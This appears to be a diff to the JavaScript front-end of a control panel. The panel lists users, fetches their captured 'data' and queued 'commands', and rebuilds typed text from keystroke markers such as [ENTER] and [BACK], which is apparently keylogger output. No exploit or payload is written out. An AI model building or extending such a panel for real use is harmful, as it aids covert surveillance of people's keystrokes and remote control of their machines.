@@ -13,9 +13,54 @@ var $data = null;
 var $log = null;
 var $run_selected = null;
 
+var $mode_text = null;
+var $mode_linebreaks = null;
+
+function oncheck_text() {
+	select_user(l_selected);
+}
+function oncheck_linebreaks() {
+	select_user(l_selected);
+}
+
+function convert_mode_text(txt) {
+	txt = txt.replace(/\[ENTER\]/g, '\n');
+	txt = txt.replace(/\[TAB\]/g, '\t');
+	txt = txt.replace(/\[BACK\]/g, 'ы');
+	txt = txt.replace(/\[.*?\]/g, '');
+
+	while (true) {
+		var pos = txt.indexOf('ы');
+		if (pos == -1) {
+			break;
+		} else if (pos == 0) {
+			txt = txt.slice(1);
+		} else {
+			txt = txt.slice(0, pos-1) + txt.slice(pos + 1);
+		}
+	}
+	
+	return txt;
+}
+function convert_mode_linebreaks(txt) {
+	txt = txt.replace(/\;/g, ';\n');
+	return txt;
+}
 function log(msg) {
 	$log.get(0).value += msg + '\n';
 	$log.scrollTop($log[0].scrollHeight);
+}
+function set_data(data) {
+	if ($mode_text.is(':checked')) {
+		data = convert_mode_text(data);
+	}
+	$data.val(data);
+}
+function set_cmds(data) {
+	if ($mode_linebreaks.is(':checked')) {
+		data = convert_mode_linebreaks(data);
+	}
+	$cmds.val(data);
 }
 function refresh_users() {
 
@@ -54,21 +99,21 @@ function select_user(index) {
 	
 	$users.find('tr').removeClass('highlight');
 	
-	if (index >= 0) {
-		$users.find('tr').eq(index).addClass('highlight');
-		$run_selected.text('Add for ' + l_users[index]).removeAttr('disabled');
-		get_data(index);
-		view_cmds(index);
-	} else {
+	if (index < 0) {
 		$run_selected.attr('disabled', 'disabled');
 		$data.val('');
 		$cmds.val('');
+	} else {
+		$users.find('tr').eq(index).addClass('highlight');
+		$run_selected.text('Run for ' + l_users[index]).removeAttr('disabled');
+		get_data(index);
+		view_cmds(index);
 	}
 }
 function get_data(index) {
 	generic_request(index, 'get_data', function(data) {
-		$data.val(data);
-		$data.scrollTop($data[0].scrollHeight);
+		set_data(data);
+		//$data.scrollTop($data[0].scrollHeight);
 		log('Fetched data for ' + l_users[index]);
 	});
 }
@@ -82,8 +127,8 @@ function clear_data(index) {
 }
 function view_cmds(index) {
 	generic_request(index, 'get_cmd', function(data) {
-		$cmds.val(data);
-		$cmds.scrollTop($cmds[0].scrollHeight);
+		set_cmds(data);
+		//$cmds.scrollTop($cmds[0].scrollHeight);
 		log('Fetched commands for ' + l_users[index]);
 	});
 }
@@ -169,6 +214,8 @@ $(document).ready(function() {
 	$cmds = $('#cmds');
 	$log = $('#log');
 	$run_selected = $('#run_selected');
+	$mode_text = $('#mode_text');
+	$mode_linebreaks = $('#mode_linebreaks');
 	
 	refresh_users();
 	
